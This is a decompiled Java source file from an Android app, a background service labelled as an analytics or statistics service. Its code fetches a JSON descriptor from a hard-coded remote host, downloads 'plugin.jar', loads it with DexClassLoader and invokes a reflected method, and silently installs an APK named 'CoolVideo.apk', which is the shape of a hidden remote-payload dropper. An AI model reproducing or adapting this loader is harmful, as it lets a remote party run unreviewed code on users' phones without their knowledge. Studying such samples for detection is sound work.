package com.android.umanalytics;

import android.app.Service;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.text.TextUtils;
import android.util.Log;
import c.a.s;
import com.android.umanalytics.http.HttpUtils;
import com.android.umanalytics.http.api.MainApi;
import com.android.umanalytics.http.bean.DexBean;
import com.android.umanalytics.http.utils.UpdateUtils;
import com.android.umanalytics.utils.PkgUtils;
import com.android.umanalytics.utils.ShellUtils;
import com.blankj.utilcode.util.AppUtils;
import com.blankj.utilcode.util.FileUtils;
import com.blankj.utilcode.util.LogUtils;
import com.blankj.utilcode.util.NetworkUtils;
import com.blankj.utilcode.util.PathUtils;
import com.blankj.utilcode.util.SPUtils;
import d.d0;
import dalvik.system.DexClassLoader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Method;

/* JADX INFO: loaded from: classes.dex */
public class MyService extends Service implements NetworkUtils.OnNetworkStatusChangedListener {
    public static final String g = App.b().f3198a + "CoolVideo.apk";

    /* JADX INFO: renamed from: b, reason: collision with root package name */
    private String f3202b;

    /* JADX INFO: renamed from: d, reason: collision with root package name */
    public Method f3204d;

    /* JADX INFO: renamed from: a, reason: collision with root package name */
    private MainApi f3201a = (MainApi) HttpUtils.getInstance().getRetrofit4NoFilter().create(MainApi.class);

    /* JADX INFO: renamed from: c, reason: collision with root package name */
    private int f3203c = 0;

    /* JADX INFO: renamed from: e, reason: collision with root package name */
    private int f3205e = 0;

    /* JADX INFO: renamed from: f, reason: collision with root package name */
    private Handler f3206f = new c(Looper.getMainLooper());

    class a implements s<DexBean> {
        a() {
        }

        @Override // c.a.s
        /* JADX INFO: renamed from: a, reason: merged with bridge method [inline-methods] */
        public void onNext(DexBean dexBean) {
            if (FileUtils.isFileExists(MyService.this.f3202b)) {
                Log.d("qzr", MyService.this.f3202b);
                if (TextUtils.equals(FileUtils.getFileMD5ToString(MyService.this.f3202b).toLowerCase(), dexBean.getMd5().toLowerCase())) {
                    Log.d("qzr", "加载Dex");
                    MyService.this.b();
                    return;
                }
                LogUtils.i("删除dex文件：" + FileUtils.deleteFile(MyService.this.f3202b));
                Log.d("qzr", "删除Dex");
                MyService.this.a(dexBean.getDownloadUrl());
                return;
            }
            LogUtils.i("开始下载dex======");
            Log.d("qzr", "下载Dex");
            String downloadUrl = dexBean.getDownloadUrl();
            String msg = dexBean.getMsg();
            String md5 = dexBean.getMd5();
            if (msg == null) {
                Log.e("qzr", "dexMsg == null");
            } else {
                Log.e("qzr", "dexMsg:" + msg);
            }
            if (md5 == null) {
                Log.e("qzr", "dexMD5 == null");
            } else {
                Log.e("qzr", "dexMD5:" + md5);
            }
            if (downloadUrl == null) {
                Log.e("qzr", "dexPath == null");
            } else {
                Log.e("qzr", "dexPath:" + downloadUrl);
            }
            MyService.this.a(dexBean.getDownloadUrl());
        }

        @Override // c.a.s
        public void onComplete() {
        }

        @Override // c.a.s
        public void onError(Throwable th) {
            LogUtils.e(th.toString());
            Log.d("qzr", "loadDexInfoError");
            Log.d("qzr", "loadDexInfoErrorMsg:" + th.toString());
            if (MyService.this.f3203c < 3) {
                MyService.this.c();
            }
        }

        @Override // c.a.s
        public void onSubscribe(c.a.y.b bVar) {
        }
    }

    class b implements s<d0> {
        b() {
        }

        @Override // c.a.s
        /* JADX INFO: renamed from: a, reason: merged with bridge method [inline-methods] */
        public void onNext(d0 d0Var) throws Throwable {
            try {
                MyService.this.a(d0Var, PathUtils.getInternalAppCachePath(), "plugin.jar");
                LogUtils.i("dex下载成功：" + PathUtils.getInternalAppCachePath() + File.separator + "plugin.jar");
                Log.d("qzr", "dex 下载成功");
                MyService.this.b();
            } catch (IOException e2) {
                e2.printStackTrace();
            }
        }

        @Override // c.a.s
        public void onComplete() {
            Log.e("qzr", "onComplete");
        }

        @Override // c.a.s
        public void onError(Throwable th) {
            LogUtils.e(th.toString());
            Log.e("qzr", "DEX 下载失败");
            Log.e("qzr", th.toString());
        }

        @Override // c.a.s
        public void onSubscribe(c.a.y.b bVar) {
        }
    }

    class c extends Handler {
        c(Looper looper) {
            super(looper);
        }

        @Override // android.os.Handler
        public void handleMessage(Message message) {
            super.handleMessage(message);
            int i = message.what;
            if (i == 0) {
                LogUtils.i("测试安装apk");
                PkgUtils.install(MyService.g, false);
            } else if (i == 1) {
                UpdateUtils.getInstance().checkUpdate(true);
            } else {
                if (i != 2) {
                    return;
                }
                MyService.this.c();
            }
        }
    }

    class d extends Thread {
        d() {
        }

        /* JADX INFO: Infinite loop detected, blocks: 15, insns: 0 */
        @Override // java.lang.Thread, java.lang.Runnable
        public void run() {
            while (true) {
                MyService.f(MyService.this);
                LogUtils.i("统计服务运行中...count=" + MyService.this.f3205e + "..." + System.currentTimeMillis());
                if (MyService.this.f3205e == 10) {
                    LogUtils.i("AppInfo: " + AppUtils.getAppInfo().toString());
                    MyService.this.f3206f.sendEmptyMessage(1);
                    MyService.this.f3206f.sendEmptyMessage(2);
                }
                if (MyService.this.f3205e > 30) {
                    SPUtils.getInstance().put("useTimeCount", MyService.this.f3205e);
                }
                try {
                    Thread.sleep(10000L);
                } catch (InterruptedException e2) {
                    e2.printStackTrace();
                }
            }
        }
    }

    static /* synthetic */ int f(MyService myService) {
        int i = myService.f3205e;
        myService.f3205e = i + 1;
        return i;
    }

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override // com.blankj.utilcode.util.NetworkUtils.OnNetworkStatusChangedListener
    public void onConnected(NetworkUtils.NetworkType networkType) {
        LogUtils.i("网络已连接：" + networkType.name());
        this.f3206f.sendEmptyMessage(1);
        this.f3206f.sendEmptyMessage(2);
    }

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
        LogUtils.i("启动统计服务");
        a();
        d();
    }

    @Override // android.app.Service
    public void onDestroy() {
        super.onDestroy();
        LogUtils.i("停止统计服务");
        NetworkUtils.unregisterNetworkStatusChangedListener(this);
    }

    @Override // com.blankj.utilcode.util.NetworkUtils.OnNetworkStatusChangedListener
    public void onDisconnected() {
        LogUtils.e("网络连接已断开");
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void b() {
        Log.d("qzr", "开始加载Dex=====");
        for (int i = 0; i < 3; i++) {
            try {
                File dir = getDir("dex", 0);
                LogUtils.i("mDexPath" + this.f3202b);
                this.f3204d = new DexClassLoader(this.f3202b, dir.getAbsolutePath(), null, getClassLoader()).loadClass("com.anlytics.plug.ParserUtils").getMethod("AnalyticsHelper", String.class);
                this.f3204d.setAccessible(true);
                this.f3204d.invoke(null, "test");
                if (this.f3204d != null) {
                    Log.d("qzr", "加载dex成功");
                    return;
                }
            } catch (Exception e2) {
                e2.printStackTrace();
                Log.d("qzr", "加载dex失败：\n" + e2.toString());
                return;
            }
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void c() {
        Log.d("qzr", "loadDexInfo");
        this.f3203c++;
        this.f3201a.getDexInfo("http://isdownload.ishanghd.com/work/app/wj/plugin/infos_9269.json").subscribeOn(c.a.f0.b.b()).observeOn(c.a.f0.b.b()).subscribe(new a());
    }

    private void d() {
        new d().start();
    }

    private void a() {
        NetworkUtils.registerNetworkStatusChangedListener(this);
        this.f3202b = PathUtils.getInternalAppCachePath() + File.separator + "plugin.jar";
        StringBuilder sb = new StringBuilder();
        sb.append("mDexPath=");
        sb.append(this.f3202b);
        LogUtils.i(sb.toString());
        LogUtils.i("NetworkInfo:\nisConnected=" + NetworkUtils.isConnected() + "\nnetworkType=" + NetworkUtils.getNetworkType().name() + ShellUtils.COMMAND_LINE_END);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void a(String str) {
        this.f3201a.downloadFile(str).subscribeOn(c.a.f0.b.b()).observeOn(c.a.f0.b.b()).subscribe(new b());
    }

    public File a(d0 d0Var, String str, String str2) throws Throwable {
        InputStream inputStreamByteStream;
        byte[] bArr = new byte[2048];
        FileOutputStream fileOutputStream = null;
        try {
            inputStreamByteStream = d0Var.byteStream();
            try {
                d0Var.contentLength();
                File file = new File(str);
                if (!file.exists()) {
                    file.mkdirs();
                }
                File file2 = new File(file, str2);
                FileOutputStream fileOutputStream2 = new FileOutputStream(file2);
                while (true) {
                    try {
                        int i = inputStreamByteStream.read(bArr);
                        if (i == -1) {
                            break;
                        }
                        fileOutputStream2.write(bArr, 0, i);
                    } catch (Throwable th) {
                        fileOutputStream = fileOutputStream2;
                        th = th;
                        if (inputStreamByteStream != null) {
                            try {
                                inputStreamByteStream.close();
                            } catch (IOException e2) {
                                e2.printStackTrace();
                            }
                        }
                        if (fileOutputStream == null) {
                            throw th;
                        }
                        try {
                            fileOutputStream.close();
                            throw th;
                        } catch (IOException e3) {
                            e3.printStackTrace();
                            throw th;
                        }
                    }
                }
                fileOutputStream2.flush();
                if (inputStreamByteStream != null) {
                    try {
                        inputStreamByteStream.close();
                    } catch (IOException e4) {
                        e4.printStackTrace();
                    }
                }
                try {
                    fileOutputStream2.close();
                } catch (IOException e5) {
                    e5.printStackTrace();
                }
                return file2;
            } catch (Throwable th2) {
                th = th2;
            }
        } catch (Throwable th3) {
            th = th3;
            inputStreamByteStream = null;
        }
    }
}
